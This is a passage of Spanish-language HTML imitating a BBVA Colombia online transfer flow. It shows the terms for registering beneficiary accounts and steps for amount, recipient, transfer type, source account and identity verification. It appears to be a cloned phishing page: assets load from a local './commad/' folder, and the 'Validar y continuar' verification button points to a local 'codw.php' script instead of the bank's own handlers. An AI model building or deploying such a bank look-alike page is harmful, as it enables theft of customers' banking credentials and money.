                                        <p>1. Este es un servicio ofrecido por EL BANCO a solicitud
                                            del CLIENTE, que consiste en la inscripción de cuentas,
                                            créditos o tarjetas de créditos pertenecientes a terceras
                                            personas, clientes del BBVA o de otros establecimientos de
                                            crédito, en adelante “CUENTAS BENEFICIARIAS”, que están siendo
                                            autorizadas por EL CLIENTE, bajo su exclusiva responsabilidad,
                                            para la realización de transferencias de fondos o pagos que
                                            sean ordenados por EL CLIENTE con débito de sus cuentas, a
                                            través de los servicios de Banca a Distancia: BBVA net, VIP
                                            BBVA net, Línea BBVA o cualquier otro medio de Banca
                                            Electrónica que sea ofrecido y comunicado por EL BANCO, en
                                            adelante BANCA A DISTANCIA.</p>
                                        <p>2. Con la aceptación de los presentes términos y
                                            condiciones del servicio, el CLIENTE autoriza al BANCO para
                                            que las "transferencias a terceros con cuenta en BBVA",
                                            "transferencias a otros establecimientos de crédito", "pago de
                                            créditos a terceros", "pago de tarjetas de crédito de terceros
                                            BBVA" y "pago de tarjetas propias y de terceros de otros
                                            establecimientos de crédito", sean originadas desde una de sus
                                            cuentas, con destino UNICAMENTE hacia las CUENTAS
                                            BENEFICIARIAS que el CLIENTE previamente inscriba y autorice,
                                            a través los medios habilitados por el Banco para este fin,
                                            como son: Red de oficinas BBVA y . BANCA A DISTANCIA.</p>
                                        <p>3. Están facultadas para solicitar el presente servicio
                                            las personas naturales titulares principales de los CONTRATOS
                                            y que sean usuarios de los productos y servicios de BANCA A
                                            DISTANCIA que emitan la autorización prevista en el numeral 2
                                            anterior.</p>
                                        <p>4. A través de este servicio, EL CLIENTE, en cualquier
                                            momento podrá autorizar una nueva CUENTA BENEFICIARIA o la
                                            cancelación de una cuenta previamente autorizada</p>
                                        <p>5. Cuando haya lugar a la cancelación de una CUENTA
                                            BENEFICIARIA, las operaciones que hayan sido ordenadas o
                                            programadas antes de esta cancelación, deberán ser ejecutadas
                                            por el Banco. En estos casos, el CLIENTE es el responsable de
                                            suprimir una a una las operaciones programadas hacia esas
                                            cuentas. En el evento de existir operaciones programadas antes
                                            de la solicitud del servicio, EL BANCO estará facultado para
                                            realizarlas sin importar si las cuentas beneficiaras hayan
                                            sido inscritas.</p>
                                        <p>6. Las CUENTAS BENEFICIARIAS que sean inscritas a través
                                            de los servicios BBVA net y VIP BBVA net, estarán sometidas a
                                            un proceso de validación y verificación por parte del BANCO y
                                            durante ese proceso serán consideradas como "Pendiente de
                                            Aprobación ". El BANCO podrá NEGAR la solicitud de inscripción
                                            de una CUENTA BENEFICIARIA si los datos suministrados no
                                            garantizan la correcta autenticación del CLIENTE. En todo
                                            caso, si no es posible para EL BANCO validar las cuentas
                                            dentro de los cinco (5) días hábiles siguientes a su
                                            inscripción, estas no serán habilitadas. Las CUENTAS
                                            BENEFICIARIAS que sean aprobadas por EL BANCO serán
                                            consideradas como "Activas" y aptas para realizar las
                                            operaciones bancarias indicadas en el numeral 2.</p>
                                        <p>7. EL BANCO se reserva el derecho de suspender o
                                            cancelar cualquiera de las CUENTAS BENEFICIARIAS inscritas por
                                            EL CLIENTE que presenten situación "Activa", con el sólo aviso
                                            con cinco hábiles días de antelación sin que haya lugar al
                                            pago de indemnización alguna.</p>
                                        <p>8. El Banco sólo será responsable de realizar las
                                            transferencias y pagos únicamente a las CUENTAS BENEFICIARIAS
                                            que sean ordenadas por EL CLIENTE mediante el ingreso de su
                                            clave de operaciones.</p>
                                        <p>9. EL BANCO es ajeno a cualquier negocio o convenio
                                            celebrado entre los terceros titulares o autorizados de las
                                            CUENTAS BENEFICIARIAS y EL CLIENTE. Por lo tanto, el BANCO
                                            queda libre de cualquier responsabilidad frente a terceros,
                                            como consecuencia errores u omisiones en la información
                                            registrada por EL CLIENTE para la ejecución de las operaciones
                                            que sean ordenadas.</p>
                                        <p>10. EL BANCO no es responsable de validar la información
                                            de los pagos que realice EL CLIENTE a través del Servicio, por
                                            lo tanto, no será responsable de ninguno de los datos
                                            suministradas por EL CLIENTE.</p>
                                        <p>11. Los horarios en que EL CLIENTE podrá tener acceso a
                                            EL SERVICIO se darán a conocer a través del Help Desk, la
                                            Línea BBVA, publicidad impresa, en la WEB del BANCO o bien,
                                            electrónicamente a través del propio servicio.</p>
                                        <p>12. EL BANCO no estará obligado a prestar el servicio,
                                            en los siguientes casos: a) Cuando la información transmitida
                                            sea insuficiente, inexacta, errónea o incompleta. b) Cuando
                                            "LAS CUENTAS BENEFICIARIAS" no se encuentren habilitadas en el
                                            servicio o se encuentren canceladas, salvo lo previsto en el
                                            numeral 5. c) Por causa de caso fortuito o fuerza mayor, o por
                                            cualquier causa ajena al control de EL BANCO.</p>
                                        <p>13. EL CLIENTE acepta expresamente que EL BANCO no será
                                            responsable de los daños y perjuicios que se le pudieran
                                            causar si, por caso fortuito, fuerza mayor o por cualquier
                                            otro acontecimiento o circunstancia inevitable no imputable al
                                            BANCO, EL CLIENTE no pudiera hacer uso del servicio o realizar
                                            alguna de las operaciones previstas en este contrato. En tal
                                            caso EL CLIENTE podrá hacer uso del servicio a través de los
                                            procedimientos de contingencia que le señalen en el Help Desk,
                                            Línea BBVA, o en la Red de oficinas.</p>
                                        <p>14. EL BANCO se reserva el derecho de efectuar
                                            modificaciones a los términos y condiciones de este contrato,
                                            bastando para ello un aviso a EL CLIENTE, ya sea por escrito,
                                            a través de la página WEB, o por medios electrónicos según
                                            corresponda, con el sólo aviso con cinco (5) días hábiles de
                                            antelación. La aceptación de la misma se entenderá si EL
                                            CLIENTE utiliza EL SERVICIO después de que éstas hayan entrado
                                            en vigor.</p>
                                        <p>15. Las condiciones vigentes de este SERVICIO y de los
                                            CONTRATOS, los límites y topes diarios, estarán disponibles
                                            para EL CLIENTE, por medios electrónicos, en los portales
                                            transaccionales del BANCO, en la página correspondiente a EL
                                            SERVICIO y se entienden notificados por dichos medios y
                                            aceptados por la utilización del SERVICIO.</p>
                                        <p>16. Lo no previsto en el presente Reglamento se regirá
                                            por las estipulaciones de LOS CONTRATOS celebrados entre EL
                                            BANCO y EL CLIENTE.</p>
                                    </div>
                                </div>
                                <div class="row buttons ">
                                    <div class="col-md-8 col-md-offset-2"></div>

                                </div>
                            </div>
                        </div>
                    </div>
                </div></div><div id="conoritaThemeform:stepnumber-3" class="ui-outputpanel ui-widget step" style="height: 633px;">
                <div data-context="MONTO_TRANSFERENCIA"></div>
                <div class="container">
                    <h3 class="step-identifier">3 de 7</h3>
                    <h1>Valor a transferir</h1>
                    <div class="row">
                        <div class="col-sm-12 col-md-6">
                            <div class="input-container__coronitaV2 cash-field  "><input id="conoritaThemeform:valueAmountToTransfer" name="conoritaThemeform:valueAmountToTransfer" type="text" autocomplete="off" maxlength="11" placeholder="Ingrese un monto" onkeydown="javascript:return formatNumber(this);" onkeypress="javascript:return isNumber(event);" onkeyup="PrimeFaces.bcn(this,event,[function(event){javascript:return formatNumber(this);},function(event){PrimeFaces.ab({s:&quot;conoritaThemeform:valueAmountToTransfer&quot;,e:&quot;keyup&quot;,p:&quot;conoritaThemeform:valueAmountToTransfer&quot;,u:&quot;conoritaThemeform:btn-submit-value-md&quot;});}])" onchange="javascript:return formatNumber(this);" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all input__coronitaV2" role="textbox" aria-disabled="false" aria-readonly="false">
                                <div class="inputerrorMessage">
                                    <h6>
                                        <i class="iconcoronita-alert"></i>
                                    </h6>
                                </div>
                            </div>

                            <div class="buttons" style="margin-top: 15px"><span id="conoritaThemeform:btn-submit-value-md" class="ui-commandlink ui-widget ui-state-disabled btn btn-blue btn-full                           ui-inputfield">Continuar</span>
                            </div>

                        </div>
                    </div>
                </div></div><div id="conoritaThemeform:stepnumber-4" class="ui-outputpanel ui-widget step" style="height: 633px;">
                <div data-context="COMPLETAR_INFORMACION_DESTINO"></div>
                <div class="container">
                    <h3 class="step-identifier">4 de 7</h3>
                    <h1>Completa la información de la <br>
                        persona que recibirá el dinero</h1>
                    <div class="row">
                        <div class="col-sm-12 col-md-6 form">
                            <div class="content-block">
                                <div class="select-container__coronitaV2"><div id="conoritaThemeform:selectDocumentTypeOption" class="ui-selectonemenu ui-widget ui-state-default ui-corner-all select__coronitaV2" role="combobox" aria-haspopup="true" aria-expanded="false" aria-owns="conoritaThemeform:selectDocumentTypeOption_items" style="min-width: 248px;"><div class="ui-helper-hidden-accessible"><input id="conoritaThemeform:selectDocumentTypeOption_focus" name="conoritaThemeform:selectDocumentTypeOption_focus" type="text" autocomplete="off" aria-expanded="false" aria-autocomplete="list" aria-activedescendant="conoritaThemeform:selectDocumentTypeOption_0" aria-describedby="conoritaThemeform:selectDocumentTypeOption_0" aria-disabled="false" placeholder="Tipo de Documento"></div><div class="ui-helper-hidden-accessible"><select id="conoritaThemeform:selectDocumentTypeOption_input" name="conoritaThemeform:selectDocumentTypeOption_input" tabindex="-1" aria-hidden="true" onchange="PrimeFaces.ab({s:&quot;conoritaThemeform:selectDocumentTypeOption&quot;,e:&quot;change&quot;,p:&quot;conoritaThemeform:selectDocumentTypeOption&quot;,u:&quot;conoritaThemeform:buttonIdentity conoritaThemeform:selectDocumentType&quot;,onco:function(xhr,status,args){initilizeCustomComponents();}});"><option value=""></option><option value="CC">Cedula de ciudadania</option><option value="CE">Cedula de extranjeria</option><option value="NIT">NIT</option><option value="TI">Tarjeta de identidad</option><option value="PP">Pasaporte</option><option value="NIP">NUIP</option><option value="CD">Carnet diplomatico</option><option value="V">Permiso Permanencia Temporal</option></select></div><label id="conoritaThemeform:selectDocumentTypeOption_label" class="ui-selectonemenu-label ui-inputfield ui-corner-all">&nbsp;</label><div class="ui-selectonemenu-trigger ui-state-default ui-corner-right"><span class="ui-icon ui-icon-triangle-1-s ui-c"></span></div></div>
                                </div>
                                <div id="hasContent3" class="input required error">

                                    <div class="input-container__coronitaV2"><input id="conoritaThemeform:inputNameIdentity" name="conoritaThemeform:inputNameIdentity" type="text" autocomplete="off" maxlength="20" placeholder="Número de documento" onkeypress="javascript:return isNumber(event);" onkeyup="PrimeFaces.ab({s:&quot;conoritaThemeform:inputNameIdentity&quot;,e:&quot;keyup&quot;,p:&quot;conoritaThemeform:inputNameIdentity&quot;,u:&quot;conoritaThemeform:buttonIdentity&quot;});" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all input__coronitaV2" role="textbox" aria-disabled="false" aria-readonly="false">
                                    </div>
                                    <div class="inputerrorMessage">
                                        <h6>
                                            <i class="iconcoronita-alert"></i>
                                        </h6>
                                    </div>
                                </div><div id="conoritaThemeform:j_idt171" class="ui-outputpanel ui-widget">
                                   </div>
                            </div>
                            <div class="buttons" style="margin-top: -15px"><span id="conoritaThemeform:buttonIdentity" class="ui-commandlink ui-widget ui-state-disabled btn btn-blue btn-full                                     ui-inputfield">Continuar</span>
                            </div>
                        </div>
                    </div>
                </div></div><div id="conoritaThemeform:stepnumber-5" class="ui-outputpanel ui-widget step" style="height: 633px;">
                <div data-context="COMO_TRANSFERIR"></div>
                <div class="container">
                    <h3 class="step-identifier">5 de 7</h3>
                    <h1>¿Cómo quieres transferir?</h1>
                    <div class="row">
                        <div class="col-sm-12 col-md-6">
                            <div class="two-elements-container"><a id="conoritaThemeform:btnPlus" href="##" class="ui-commandlink ui-widget option-card " onclick="PF('statusDialog').show();PrimeFaces.ab({s:&quot;conoritaThemeform:btnPlus&quot;,u:&quot;conoritaThemeform:btn-submit-value-no-client conoritaThemeform:pnlPpal conoritaThemeform:btnOthers conoritaThemeform:btnPlus&quot;,onco:function(xhr,status,args){PF('statusDialog').hide();}});return false;">
                                    <img src="./commad/img-starship.svg" alt="">
                                    <div class="textBlockCard">

                                        <span class="oc-highlight">Destacada</span>
                                        <h3 class="oc-title">Transferencia plus</h3>
                                        <p class="oc-description">Envía el dinero al instante invitando a tu contacto a BBVA
                                            móvil.</p>
                                        <span class="oc-label" style="">Tiempo: Al instante</span>
                                    </div></a>
                                <br><a id="conoritaThemeform:btnOthers" href="##" class="ui-commandlink ui-widget option-card " onclick="PF('statusDialog').show();PrimeFaces.ab({s:&quot;conoritaThemeform:btnOthers&quot;,u:&quot;conoritaThemeform:btn-submit-value-no-client conoritaThemeform:pnlPpal conoritaThemeform:btnOthers conoritaThemeform:btnPlus&quot;,onco:function(xhr,status,args){PF('statusDialog').hide();}});return false;">
                                    <img src="./commad/img-sadface.svg" alt="">
                                    <div class="textBlockCard">

                                        <h3 class="oc-title">Transferencia a otro banco</h3>
                                        <p class="oc-description">Debes tener los datos de la persona y la información de la
                                            cuenta.</p>
                                        <span class="oc-label">Tiempo: 1 día hábil mínimo</span>
                                    </div></a>
                            </div>

                            <div class="buttons"><span id="conoritaThemeform:btn-submit-value-no-client" class="ui-commandlink ui-widget ui-state-disabled btn btn-blue btn-full btn-full-md ui-inputfield">Continuar</span>
                            </div>
                        </div>

                        <div class="col-md-5 col-sm-12 col-md-offset-1"><span id="conoritaThemeform:pnlPpal"><span id="conoritaThemeform:pnlNone">
                                    <div class="help blueLightWhite">
                                        <i class="iconcoronita-info"></i>
                                        <h6>Transfiere sin costo</h6>
                                        <p>Estos 2 tipos de transferencia son gratis, no te generarán ningún costo.</p>
                                    </div></span></span>
                        </div>
                    </div>
                </div></div><div id="conoritaThemeform:stepnumber-6" class="ui-outputpanel ui-widget step" style="height: 633px;">
                <div data-context="CUENTA_ORIGEN_TRANSFERENCIA"></div>
                <div class="helpMobile help mobile tablet">
                    <div class="container">
                        <div class="contain">
                            <h4>VALOR A TRANSFERIR</h4>
                            <h5><div id="conoritaThemeform:valueToTransfer" class="ui-outputpanel ui-widget">
                                    <span>$</span></div>
                            </h5>
                            <h6>Comisión:</h6>
                            <h6>
                                 <img src="./commad/optimistic.svg" alt="">
                            </h6>
                        </div>
                    </div>
                </div>
                <div class="container">
                    <h3 class="step-identifier">6 de 7
                    </h3>
                    <h1 class="desktop">Vas a transferir desde:</h1>
                    <div class="row">
                        <div class="col-sm-12 col-md-6 grey100mob"><div id="conoritaThemeform:mainPnlProduct" class="ui-outputpanel ui-widget"><div id="conoritaThemeform:customPanelTransfer" class="ui-outputpanel ui-widget" style="margin-bottom:10px"><span id="conoritaThemeform:customRadioProduct" class="ui-helper-hidden"></span></div>
                                <div class="c-paymentList" id="scrollContainerListFrom"><div id="conoritaThemeform:listMisCuentas" class="ui-outputpanel ui-widget"></div>
                                </div>

                                <div class="buttons"><span id="conoritaThemeform:btn-next-pl-sm" class="ui-commandlink ui-widget ui-state-disabled btn btn-blue btn-full btn-full-md ui-inputfield">Continuar</span>
                                </div></div>
                        </div>

                        <div class="col-md-5 col-sm-12 col-md-offset-1">
                            <div class="helpersGroup">
                                <div class="help grey100 desktop">
                                    <div class="contain editable">
                                        <h4>VALOR A TRANSFERIR</h4>
                                        <h5>
                                            <span>$</span>
                                        </h5>
                                    </div><a id="conoritaThemeform:boton-paso-2" href="##" class="ui-commandlink ui-widget" onclick="PrimeFaces.ab({s:&quot;conoritaThemeform:boton-paso-2&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:boton-paso-2&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});;PrimeFaces.ab({s:&quot;conoritaThemeform:boton-paso-2&quot;});return false;">
                                            <div class="modify">
                                                <span>Editar</span>
                                            </div></a>
                                </div>
                                <div class="help greenWhite desktop">
                                    <div class="contain">
                                        <h6>Comisión:</h6>
                                        <h6 class="value">
                                             <img src="./commad/optimistic.svg" alt="">
                                        </h6>
                                    </div>
                                </div>
                                <div class="help grey100 desktop">
                                    <div class="contain editable"><div id="conoritaThemeform:j_idt208" class="ui-outputpanel ui-widget">
                                            <h4>PERSONA QUE
                                                RECIBE</h4></div>
                                    </div><a id="conoritaThemeform:boton-paso-1" href="##" class="ui-commandlink ui-widget" onclick="PrimeFaces.ab({s:&quot;conoritaThemeform:boton-paso-1&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:boton-paso-1&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});;PrimeFaces.ab({s:&quot;conoritaThemeform:boton-paso-1&quot;});return false;">
                                        <div class="modify">
                                            <span>Editar</span>
                                        </div></a>
                                    <div class="contain editable"><div id="conoritaThemeform:j_idt215" class="ui-outputpanel ui-widget">
                                            <p>
                                                
                                            </p></div><div id="conoritaThemeform:j_idt219" class="ui-outputpanel ui-widget">
                                            <h4>
                                                
                                            </h4></div>
                                    </div>
                                    <div class="modify">
                                        <p style="float: left">•
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div></div><div id="conoritaThemeform:stepnumber-7" class="ui-outputpanel ui-widget step active" style="height: 633px;">
                <div data-context="VERIFICAR_CUENTA"></div>

<input type="hidden" name="conoritaThemeform:profileComposite:confirmProfiles" value="conoritaThemeform:profileComposite:confirmProfiles">

        <div class="container"><div id="conoritaThemeform:profileComposite:confirmProfiles:cardPanelMobile" class="ui-outputpanel ui-widget col-sm-12 col-sm-offset-1 mobile tarjeta tablet">
                    <div class="help" style="text-align: center">
                        <div class="dynamicCard">
                            <img src="./commad/bbva.png" class="tcenter" alt="visa"><span class="cardNumber"></span>
                        </div>
                    </div></div>
                <br class="desktop">
                <br class="desktop">
                <h1>Antes de continuar, necesitamos <br class="desktop">verificar tu identidad</h1>
                <h2>
                    Debes habilitarte para hacer operaciones BBVA Net.
                    <br class="desktop">
                </h2>
                <div class="row"><div id="conoritaThemeform:profileComposite:confirmProfiles:j_idt240" class="ui-outputpanel ui-widget col-sm-12 col-md-6">
                        <div class=" transparent mobile tarjeta tablet">
                            <div class="card-wrappermob col-md-12"></div>
                        </div>

                        <div class="buttons"><a id="conoritaThemeform:profileComposite:confirmProfiles:btn-next-pl-screen-activate" href="codw.php" class="ui-commandlink ui-widget btn btn-blue btn-full btn-full-md openOverlay ui-inputfield" onclick="PF('statusDialog').show();PrimeFaces.ab({s:&quot;conoritaThemeform:profileComposite:confirmProfiles:btn-next-pl-screen-activate&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:profileComposite:confirmProfiles:btn-next-pl-screen-activate&quot;,u:&quot;conoritaThemeform:profileComposite:confirmProfiles&quot;});;PrimeFaces.ab({s:&quot;conoritaThemeform:profileComposite:confirmProfiles:btn-next-pl-screen-activate&quot;,onco:function(xhr,status,args){PF('statusDialog').hide();initilizeCustomComponents();}});return false;">Validar y continuar</a>
                        </div></div><div id="conoritaThemeform:profileComposite:confirmProfiles:cardPanel" class="ui-outputpanel ui-widget col-sm-12 col-md-5 col-sm-offset-1">
                        <div class="help tcActivacionPT half-illustration desktop" style="background:#eef9fb">
                            <div class="dynamicCard">
                                <img src="./commad/mobile-token.svg" style="top: -4rem !important;" class="tcenter" alt="visa">
                            </div>
                        </div></div>
                </div>
        </div>
        <link href="./commad/activeProfile.css" rel="stylesheet" type="text/css"><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="e8s1">
</div><div id="conoritaThemeform:stepnumber-8" class="ui-outputpanel ui-widget step" style="height: 633px;"><div id="conoritaThemeform:j_idt287" class="ui-outputpanel ui-widget">
                    <div data-context="INGRESO_TOKEN"></div></div></div><div id="conoritaThemeform:stepnumber-9" class="ui-outputpanel ui-widget step confirmation success-bg" style="height: 633px;">
                <div class="container">
                    <div class="col-sm-12 col-md-5">
                        <i class="iconcoronita-checkmark"></i>
                        <h1>Listo
                            </h1>
                        <h2>Finalizaste tu transferencia</h2>

                        <div class="desktop">
                            <div class="twoButtons"><a id="conoritaThemeform:j_idt322" href="##" class="ui-commandlink ui-widget btn btn-blue btn-full btn-full-md goBeginningBtn" onclick="PF('statusDialog').show();PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt322&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:j_idt322&quot;,u:&quot;conoritaThemeform:pasosForm header&quot;});;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt322&quot;,onco:function(xhr,status,args){PF('statusDialog').hide();}});return false;">
                                    Hacer otra transferencia
                                </a><a id="conoritaThemeform:j_idt324" href="##" class="ui-commandlink ui-widget btn-nobackground" onclick="PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt324&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:j_idt324&quot;});;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt324&quot;,onst:function(cfg){PF('statusDialog').show();},onco:function(xhr,status,args){PF('statusDialog').hide();}});return false;">
                                    Ir a mis productos
                                </a>
                                <span class="separator-line"></span><a id="conoritaThemeform:j_idt327" href="##" class="ui-commandlink ui-widget btn-nobackground" onclick="printElement('receiptDiv');;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt327&quot;,onst:function(cfg){PF('statusDialog').show();},onco:function(xhr,status,args){PF('statusDialog').hide();}});return false;">
                                    <i class="iconcoronita-print"></i>Imprimir
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-12 col-md-5 col-md-offset-2">
                        <div class="help recibo order2">
                            <img src="./commad/ticket.png" alt="" class="adjustment">
                            <div class="receipt" id="receiptDiv">
                                <img src="./commad/BBVA.svg" alt="BBVA">
                                <div class="receiptContent"><div id="conoritaThemeform:j_idt332" class="ui-outputpanel ui-widget">
                                        <h1>Transferencia exitosa</h1></div>
                                    <h2>
                                        <small>$</small>
                                    </h2>
                                    <h3>
                                        
                                    </h3>
                                    <h3>
                                        IP 186.99.1.47
                                    </h3>
                                </div>
                                <div class="receiptSummary">
                                    <div class="contain"><div id="conoritaThemeform:j_idt337" class="ui-outputpanel ui-widget">
                                            <h4>Producto destino</h4></div><div id="conoritaThemeform:j_idt341" class="ui-outputpanel ui-widget" style="width: 180px">
                                            <p>
                                                
                                                <br>
                                                
                                                
                                                    <br>
                                                •
                                                
                                                <br>
                                                
                                            </p></div>
                                    </div>
                                    <div class="contain">
                                        <h4>Producto origen</h4>
                                        <p>
                                            <br>
                                            •
                                        </p>
                                    </div>
                                </div>
                            </div>
                            <img src="./commad/ticket.png" alt="" class="adjustment transform">
                        </div>
                    </div>
                    <div class="mobile">
                        <div class="twoButtons"><a id="conoritaThemeform:j_idt351" href="##" class="ui-commandlink ui-widget btn btn-next btn-above" onclick="PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt351&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:j_idt351&quot;,u:&quot;conoritaThemeform:pasosForm header&quot;});;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt351&quot;,onst:function(cfg){PF('statusDialog').show();},onco:function(xhr,status,args){PF('statusDialog').hide();initilizeCustomComponents();}});return false;">
                                Hacer otra transferencia
                            </a><a id="conoritaThemeform:j_idt353" href="##" class="ui-commandlink ui-widget link" onclick="PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt353&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:j_idt353&quot;});;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt353&quot;,onst:function(cfg){PF('statusDialog').show();},onco:function(xhr,status,args){PF('statusDialog').hide();}});return false;">
                                <h2>Ir a mis productos</h2></a>
                            <span class="separator-line"></span><a id="conoritaThemeform:j_idt356" href="##" class="ui-commandlink ui-widget btn-nobackground" onclick="printElement('receiptDiv');;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt356&quot;,onst:function(cfg){PF('statusDialog').show();},onco:function(xhr,status,args){PF('statusDialog').hide();initilizeCustomComponents();}});return false;">
                                <i class="iconcoronita-print"></i>Imprimir
                            </a>
                        </div>
                    </div>
                </div></div><div id="conoritaThemeform:j_idt365" class="ui-outputpanel ui-widget">
    <div class="overlay">
        <div class="content">
            <img src="./commad/overlaySuccess.svg" alt="">
            <p>¡Activación exitosa!</p>
        </div>
    </div></div><div id="conoritaThemeform:j_idt368" class="ui-outputpanel ui-widget">
                <script>
                    if(loadComplete){
                        changeContext();
                    }
                </script></div><span id="conoritaThemeform:modal-error-panel">
                <div class="modal fade modal-md out m-error" tabindex="-1" id="error">
                    <div class="modal-dialog modal-sm" role="document">
                        <div class="modal-content">
                            <div class="modal-header"><a id="conoritaThemeform:j_idt371" href="##" onclick="PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;conoritaThemeform:j_idt371&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});;return false">
                                    <button type="button" class="close btnModalClose" data-dismiss="modal" aria-label="Close" onclick="document.getElementById('error').style.display = 'none'; PF('statusDialog').hide();">
                                        
                                    </button></a>
                            </div>
                            <div class="modal-body">
                                <div class="row">
                                    <div class="col-md-12 iconModal">
                                        <img src="./commad/error.svg" alt="">
                                    </div>
                                    <h1>Discúlpanos</h1><div id="conoritaThemeform:j_idt375" class="ui-outputpanel ui-widget">
                                        <div class="col-md-12">
                                            <p class="center">
                                                 <br class="desktop">
                                                
                                            </p>
                                        </div></div>
                                </div>
                                <div class="row buttons">
                                    <div class="col-md-8 col-md-offset-2"><a id="conoritaThemeform:submit-step-1" href="##" onclick="jsf.util.chain(this,event,'document.getElementById(\'error\').style.display = \'none\';','PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;conoritaThemeform:submit-step-1&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});');return false" class="submit-step-1 modify">Reintentar</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div></span>

            <div class="modal fade modal-md out" id="dcModal" tabindex="-1" role-dialog="">
                <div class="modal-dialog modal-sm" role="document">
                    <div class="modal-content">
                        <div class="modal-header">

                            <button type="button" class="close" data-dismiss="modal" aria-label="Close" onclick="document.getElementById('dcModal').style.display = 'none'; PF('statusDialog').hide();">
                                
                            </button>
                        </div>
                        <div class="modal-body">
                            <div class="row">
                                <div class="col-md-12 iconModal">
                                    <img class="" style="max-width: 170px;" src="./commad/info.svg" alt="">
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-12">
                                    <h2 class="center" style="color: #5D5A5A">
                                        La inscripción y transferencia de cuentas propias de cualquier entidad lo debes hacer por "Mis Cuentas".
                                    </h2>
                                </div>
                            </div>
                            <div class="row buttons ">
                                <div class="col-md-8 col-md-offset-2"><a id="conoritaThemeform:j_idt381" href="##" class="ui-commandlink ui-widget btn btn-next submit-step-1 btnModalContinue btn-blue" onclick="document.getElementById('dcModal').style.display = 'none';;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt381&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:j_idt381&quot;,u:&quot;conoritaThemeform:pasosForm header&quot;});;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt381&quot;,onco:function(xhr,status,args){PF('statusDialog').hide();}});return false;">Entendido</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="modal fade modal-md out" id="bmModal" tabindex="-1" role-dialog="">
                <div class="modal-dialog modal-sm" role="document">
                    <div class="modal-content">
                        <div class="modal-header">

                            <button type="button" class="close" data-dismiss="modal" aria-label="Close" onclick="document.getElementById('bmModal').style.display = 'none'; PF('statusDialog').hide();">
                                
                            </button>
                        </div>
                        <div class="modal-body">
                            <div class="row">
                                <div class="col-md-12 iconModal">
                                    <img class="" src="./commad/error.svg" alt="">
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-12">
                                    <h1 class="center">
                                        Debes habilitarte para hacer<br class="desktop">
                                        operaciones en BBVA móvil
                                    </h1>
                                    <p class="center" style="margin-bottom: 0px">Habilita tu
                                        BBVA móvil ingresando en la aplicación en:</p>
                                    <h4 style="font-style: normal">Menú &gt; Perfil y ajustes &gt;
                                        Crear o cambiar contraseña de operaciones</h4>
                                </div>
                            </div>
                            <div class="row buttons ">
                                <div class="col-md-8 col-md-offset-2"><a id="conoritaThemeform:j_idt383" href="##" class="ui-commandlink ui-widget submit-step-1 modify" onclick="document.getElementById('bmModal').style.display = 'none';;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt383&quot;,onco:function(xhr,status,args){PF('statusDialog').hide();}});return false;">Entendido</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div></div>


            </div>
        </form></div><input type="hidden" name="javax.faces.ViewState" value="e8s1" autocomplete="off"><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="e8s1">

<form id="j_idt387" name="j_idt387" method="post" action="#" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="j_idt387" value="j_idt387">

    <div class="modal modal-md out m-error" tabindex="-1" id="coronita-modal" role-dialog="">
        <div class="modal-dialog modal-sm" role="document">
            <div class="modal-content">
                <div class="modal-header"><a id="j_idt387:j_idt389" href="##" class="ui-commandlink ui-widget close btnModalClose" onclick="document.getElementById('coronita-modal').style.display = 'none';;PrimeFaces.ab({s:&quot;j_idt387:j_idt389&quot;});return false;" type="button">
                        </a>
                </div>
                <div class="modal-body">
                    <div class="row">
                        <div class="col-md-12 iconModal">
                            <img src="./commad/error.svg" alt="">
                        </div>
                        <h1>¿Estás seguro de querer salir del proceso?</h1>
                        <div class="col-md-12">
                            <p class="center">Se perderán los datos introducidos.</p>
                        </div>
                    </div>
                    <div class="row buttons ">
                        <div class="col-md-8 col-md-offset-2 twoButtons"><a id="j_idt387:j_idt392" href="##" class="ui-commandlink ui-widget btn btn-next submit-step-1 btnModalContinue btn-blue" onclick="document.getElementById('coronita-modal').style.display = 'none';;PrimeFaces.ab({s:&quot;j_idt387:j_idt392&quot;});return false;" type="button">
                                Continuar en el proceso
                            </a><a id="j_idt387:j_idt396" href="##" onclick="PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;j_idt387:j_idt396&quot;});;return false" class="submit-step-1 modify btn btn-nobackground">Salir del proceso</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="e8s1">
</form>

</body></html>